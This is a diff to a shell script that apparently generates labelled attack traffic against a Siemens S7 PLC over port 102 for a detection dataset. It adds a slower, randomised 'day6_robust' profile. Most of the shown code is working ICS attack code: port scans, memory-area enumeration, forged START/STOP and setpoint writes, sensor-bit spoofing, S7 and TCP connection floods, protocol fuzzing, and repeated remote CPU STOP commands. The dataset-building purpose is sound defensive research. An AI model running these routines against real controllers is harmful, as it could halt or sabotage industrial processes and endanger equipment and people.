@@ -63,6 +63,18 @@ COOLDOWN_S="${COOLDOWN_S:-600}"
 ATTACK_REPETITIONS="${ATTACK_REPETITIONS:-3}"
 ATTACK_DURATION_S="${ATTACK_DURATION_S:-600}"
 SHORT_ATTACK_DURATION_S="${SHORT_ATTACK_DURATION_S:-300}"
+ATTACK_PROFILE="${ATTACK_PROFILE:-standard}"
+
+DAY6_GAP_MIN_S="${DAY6_GAP_MIN_S:-120}"
+DAY6_GAP_MAX_S="${DAY6_GAP_MAX_S:-900}"
+DAY6_SCAN_ENUM_MIN_S="${DAY6_SCAN_ENUM_MIN_S:-600}"
+DAY6_SCAN_ENUM_MAX_S="${DAY6_SCAN_ENUM_MAX_S:-1200}"
+DAY6_INTEGRITY_MIN_S="${DAY6_INTEGRITY_MIN_S:-480}"
+DAY6_INTEGRITY_MAX_S="${DAY6_INTEGRITY_MAX_S:-900}"
+DAY6_AVAIL_MIN_S="${DAY6_AVAIL_MIN_S:-180}"
+DAY6_AVAIL_MAX_S="${DAY6_AVAIL_MAX_S:-360}"
+DAY6_CPU_MIN_S="${DAY6_CPU_MIN_S:-120}"
+DAY6_CPU_MAX_S="${DAY6_CPU_MAX_S:-240}"
 
 DEFAULT_CD_MS="${DEFAULT_CD_MS:-5000}"
 RESTORE_TIMES1_MS="${RESTORE_TIMES1_MS:-0}"
@@ -210,6 +222,12 @@ duration_for_day() {
 rand_duration() {
     local base="${1:-$ATTACK_DURATION_S}"
     "$PY_CMD" -c "import random,sys; b=max(1,int(float(sys.argv[1]))); lo=max(1,int(b*0.75)); hi=max(lo,int(b*1.25)); print(random.randint(lo, hi))" "$base"
+}
+
+rand_range() {
+    local min_s="$1"
+    local max_s="$2"
+    "$PY_CMD" -c "import random,sys; lo=max(1,int(float(sys.argv[1]))); hi=max(lo,int(float(sys.argv[2]))); print(random.randint(lo, hi))" "$min_s" "$max_s"
 }
 
 start_capture() {
@@ -482,23 +500,27 @@ start_attack_process() {
     case "$scenario" in
         SCAN_PORT)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import socket
 import time
 
 target = "$TARGET_IP"
-print(f"[SCAN] TCP port 102 scan loop against {target}", flush=True)
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+sleep_range = (8.0, 30.0) if profile == "day6_robust" else (0.4, 1.5)
+print(f"[SCAN] TCP port 102 scan loop against {target} profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         s = socket.create_connection((target, 102), timeout=1.0)
         s.close()
     except Exception:
         pass
-    time.sleep(random.uniform(0.4, 1.5))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         ENUM_TAGS)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import time
 
@@ -512,9 +534,11 @@ from snap7.util import get_dint
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+sleep_range = (2.0, 5.0) if profile == "day6_robust" else (0.15, 0.5)
 c = snap7.client.Client()
 n = 0
-print("[ENUM] reading M/Q/I areas", flush=True)
+print(f"[ENUM] reading M/Q/I areas profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         if not c.get_connected():
@@ -539,11 +563,12 @@ while True:
         except Exception:
             pass
         time.sleep(1.0)
-    time.sleep(random.uniform(0.15, 0.5))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         RWRITE_BURST)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import time
 
@@ -558,10 +583,13 @@ from attack_event_logger import log_attack_event
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+sleep_range = (8.0, 25.0) if profile == "day6_robust" else (0.15, 0.45)
+pulse_s = 0.25 if profile == "day6_robust" else 0.12
 c = snap7.client.Client()
 n = 0
 toggle_stop = True
-print("[RWRITE] Merker control burst on M5.0 START / M5.1 STOP; no PA/Q write", flush=True)
+print(f"[RWRITE] Merker control writes on M5.0 START / M5.1 STOP; no PA/Q write profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         if not c.get_connected():
@@ -583,7 +611,7 @@ while True:
         if old_stop != new_stop:
             log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
         if not toggle_stop:
-            time.sleep(0.12)
+            time.sleep(pulse_s)
             m5 = c.read_area(Areas.MK, 0, 5, 1)
             old_start = get_bool(m5, 0, 0)
             set_bool(m5, 0, 0, False)
@@ -602,11 +630,12 @@ while True:
         except Exception:
             pass
         time.sleep(1.0)
-    time.sleep(random.uniform(0.15, 0.45))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         SETPOINT_ATTACK)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import time
 
@@ -621,10 +650,12 @@ from attack_event_logger import log_attack_event
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+sleep_range = (20.0, 60.0) if profile == "day6_robust" else (0.4, 1.2)
 c = snap7.client.Client()
 values = [100, 250, 45000, 60000, 90000]
 n = 0
-print("[SETPOINT] randomizing CD1/CD2/CD3 timers", flush=True)
+print(f"[SETPOINT] randomizing CD1/CD2/CD3 timers profile={profile} sleep={sleep_range}", flush=True)
 def read_dint(client, offset):
     return get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)
 def write_dint(client, offset, value, signal):
@@ -655,11 +686,12 @@ while True:
         except Exception:
             pass
         time.sleep(1.0)
-    time.sleep(random.uniform(0.4, 1.2))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         SENSOR_SPOOF)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import time
 
@@ -674,10 +706,12 @@ from attack_event_logger import log_attack_event
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+sleep_range = (15.0, 45.0) if profile == "day6_robust" else (0.4, 1.5)
 c = snap7.client.Client()
 patterns = [(1,1,1), (1,0,1), (0,1,1)]
 n = 0
-print("[SPOOF] spoofing Vat_1/Vat_2/Vat_3 bits", flush=True)
+print(f"[SPOOF] spoofing Vat_1/Vat_2/Vat_3 bits profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         if not c.get_connected():
@@ -715,11 +749,12 @@ while True:
         except Exception:
             pass
         time.sleep(1.0)
-    time.sleep(random.uniform(0.4, 1.5))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         STEALTHY_WRITE)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import time
 
@@ -734,9 +769,11 @@ from attack_event_logger import log_attack_event
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+sleep_range = (20.0, 60.0) if profile == "day6_robust" else (1.5, 3.0)
 c = snap7.client.Client()
 n = 0
-print("[STEALTHY] low-rate STOP writes on M5.1", flush=True)
+print(f"[STEALTHY] low-rate STOP writes on M5.1 profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         if not c.get_connected():
@@ -763,11 +800,12 @@ while True:
         except Exception:
             pass
         time.sleep(1.0)
-    time.sleep(random.uniform(1.5, 3.0))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         S7_FLOOD)
             "$PY_CMD" -u - <<PYEOF &
+import os
 import random
 import threading
 import time
@@ -777,27 +815,39 @@ import snap7
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
 threads_n = int("$S7_FLOOD_THREADS")
+if profile == "day6_robust":
+    threads_n = max(1, min(threads_n, 2))
 lock = threading.Lock()
 ok = 0
 fail = 0
-def worker():
+def one_connect():
     global ok, fail
-    while True:
-        try:
-            c = snap7.client.Client()
-            c.connect(target, rack, slot)
-            time.sleep(random.uniform(0.03, 0.2))
-            c.disconnect()
-            with lock:
-                ok += 1
-                if ok % 100 == 0:
-                    print(f"[S7_FLOOD] ok={ok} fail={fail}", flush=True)
-        except Exception:
-            with lock:
-                fail += 1
+    try:
+        c = snap7.client.Client()
+        c.connect(target, rack, slot)
+        time.sleep(random.uniform(0.03, 0.2))
+        c.disconnect()
+        with lock:
+            ok += 1
+            if ok % 100 == 0:
+                print(f"[S7_FLOOD] ok={ok} fail={fail}", flush=True)
+    except Exception:
+        with lock:
+            fail += 1
+        if profile != "day6_robust":
             time.sleep(random.uniform(0.02, 0.15))
-print(f"[S7_FLOOD] {threads_n} Snap7 connection workers", flush=True)
+def worker():
+    while True:
+        if profile == "day6_robust":
+            for _ in range(random.randint(3, 8)):
+                one_connect()
+                time.sleep(random.uniform(0.08, 0.5))
+            time.sleep(random.uniform(8.0, 25.0))
+        else:
+            one_connect()
+print(f"[S7_FLOOD] {threads_n} Snap7 connection workers profile={profile}", flush=True)
 workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads_n)]
 for t in workers:
     t.start()
@@ -807,22 +857,35 @@ PYEOF
             ;;
         SYN_FLOOD)
             "$PY_CMD" -u - <<PYEOF &
+import os
+import random
 import socket
 import threading
 import time
 
 target = "$TARGET_IP"
+profile = os.environ.get("ATTACK_PROFILE", "standard")
 threads_n = int("$SYN_FLOOD_THREADS")
+if profile == "day6_robust":
+    threads_n = max(1, min(threads_n, 3))
+def one_connect():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.08)
+        s.connect((target, 102))
+        s.close()
+    except Exception:
+        pass
 def worker():
     while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.08)
-            s.connect((target, 102))
-            s.close()
-        except Exception:
-            pass
-print(f"[SYN_FLOOD] {threads_n} TCP connect workers on port 102", flush=True)
+        if profile == "day6_robust":
+            for _ in range(random.randint(5, 15)):
+                one_connect()
+                time.sleep(random.uniform(0.05, 0.25))
+            time.sleep(random.uniform(8.0, 20.0))
+        else:
+            one_connect()
+print(f"[SYN_FLOOD] {threads_n} TCP connect workers on port 102 profile={profile}", flush=True)
 workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads_n)]
 for t in workers:
     t.start()
@@ -838,10 +901,12 @@ import socket
 import time
 
 target = "$TARGET_IP"
+profile = os.environ.get("ATTACK_PROFILE", "standard")
 min_len = int("$FUZZ_PAYLOAD_MIN")
 max_len = int("$FUZZ_PAYLOAD_MAX")
+sleep_range = (5.0, 20.0) if profile == "day6_robust" else (0.05, 0.25)
 n = 0
-print("[FUZZ] malformed TPKT/S7-like payloads on port 102", flush=True)
+print(f"[FUZZ] malformed TPKT/S7-like payloads on port 102 profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         payload = os.urandom(random.randint(min_len, max_len))
@@ -856,11 +921,13 @@ while True:
             print(f"[FUZZ] {n} malformed packets", flush=True)
     except Exception:
         pass
-    time.sleep(random.uniform(0.05, 0.25))
+    time.sleep(random.uniform(*sleep_range))
 PYEOF
             ;;
         CPU_STOP)
             "$PY_CMD" -u - <<PYEOF &
+import os
+import random
 import time
 
 import snap7
@@ -869,8 +936,11 @@ from attack_event_logger import log_attack_event
 target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
+profile = os.environ.get("ATTACK_PROFILE", "standard")
+stop_hold_s = 10 if profile == "day6_robust" else 5
+cycle_sleep = (45.0, 90.0) if profile == "day6_robust" else (15.0, 15.0)
 c = snap7.client.Client()
-print("[CPU_STOP] enabled by operator; attempting remote STOP/HOT_START", flush=True)
+print(f"[CPU_STOP] enabled by operator; attempting remote STOP/HOT_START profile={profile}", flush=True)
 while True:
     try:
         if not c.get_connected():
@@ -878,14 +948,14 @@ while True:
         c.plc_stop()
         log_attack_event("CPU_STOP", area="CPU", data_type="cpu_command", new_value="STOP", status="command_sent")
         print("[CPU_STOP] STOP sent", flush=True)
-        time.sleep(5)
+        time.sleep(stop_hold_s)
         try:
             c.plc_hot_start()
             log_attack_event("CPU_HOT_START", area="CPU", data_type="cpu_command", new_value="HOT_START", status="command_sent")
             print("[CPU_STOP] HOT_START sent", flush=True)
         except Exception as exc:
             print(f"[CPU_STOP][WARN] HOT_START denied: {exc}", flush=True)
-        time.sleep(15)
+        time.sleep(random.uniform(*cycle_sleep))
     except Exception as exc:
         print(f"[CPU_STOP][WARN] denied or failed: {exc}", flush=True)
         try:
@@ -922,7 +992,7 @@ run_attack_episode() {
     local duration_s="$2"
     local rep="$3"
     local episode_id="${SESSION_ID}:day${DAY}:${scenario}:r${rep}"
-    local note="rep=${rep};duration_s=${duration_s};host=${HOST_ID}"
+    local note="rep=${rep};duration_s=${duration_s};host=${HOST_ID};profile=${ATTACK_PROFILE}"
     local pid
 
     if [[ "$ATTACK_EVENT_LOG_ENABLED" == "1" ]]; then
@@ -931,7 +1001,7 @@ run_attack_episode() {
     else
         export ATTACK_EVENT_FILE=""
     fi
-    export ATTACK_EPISODE_ID="$episode_id" ATTACK_SCENARIO="$scenario" ATTACK_DAY="$DAY" SESSION_ID HOST_ID
+    export ATTACK_EPISODE_ID="$episode_id" ATTACK_SCENARIO="$scenario" ATTACK_DAY="$DAY" SESSION_ID HOST_ID ATTACK_PROFILE
 
     label "$scenario" "START" "$episode_id" "$note"
     start_attack_process "$scenario"
@@ -1017,20 +1087,40 @@ mixed_scenarios() {
     "$PY_CMD" -c "import random,sys; items=sys.argv[1].split(); random.shuffle(items); print(' '.join(items))" "$items"
 }
 
+day6_duration_for() {
+    case "$1" in
+        SCAN_PORT|ENUM_TAGS)
+            rand_range "$DAY6_SCAN_ENUM_MIN_S" "$DAY6_SCAN_ENUM_MAX_S"
+            ;;
+        RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE)
+            rand_range "$DAY6_INTEGRITY_MIN_S" "$DAY6_INTEGRITY_MAX_S"
+            ;;
+        S7_FLOOD|SYN_FLOOD|PROTOCOL_FUZZ)
+            rand_range "$DAY6_AVAIL_MIN_S" "$DAY6_AVAIL_MAX_S"
+            ;;
+        CPU_STOP)
+            rand_range "$DAY6_CPU_MIN_S" "$DAY6_CPU_MAX_S"
+            ;;
+        *)
+            rand_duration "$SHORT_ATTACK_DURATION_S"
+            ;;
+    esac
+}
+
+day6_gap() {
+    rand_range "$DAY6_GAP_MIN_S" "$DAY6_GAP_MAX_S"
+}
+
 run_attacker_day6() {
     local scenario
     local idx=1
+    ATTACK_PROFILE="day6_robust"
+    export ATTACK_PROFILE
+    echo "[att] Day 6 robustness/OOD test: same labels, altered rates, random order, wide gaps"
     benign_period "$WARMUP_S" "warmup"
     for scenario in $(mixed_scenarios); do
-        case "$scenario" in
-            SCAN_PORT|CPU_STOP|S7_FLOOD|SYN_FLOOD|PROTOCOL_FUZZ|STEALTHY_WRITE)
-                run_attack_episode "$scenario" "$(rand_duration "$SHORT_ATTACK_DURATION_S")" "$idx"
-                ;;
-            *)
-                run_attack_episode "$scenario" "$(rand_duration "$ATTACK_DURATION_S")" "$idx"
-                ;;
-        esac
-        benign_period "$(rand_duration "$BENIGN_GAP_S")" "mixed_gap_${idx}"
+        run_attack_episode "$scenario" "$(day6_duration_for "$scenario")" "$idx"
+        benign_period "$(day6_gap)" "day6_robust_gap_${idx}"
         idx=$((idx + 1))
     done
     benign_period "$COOLDOWN_S" "cooldown"
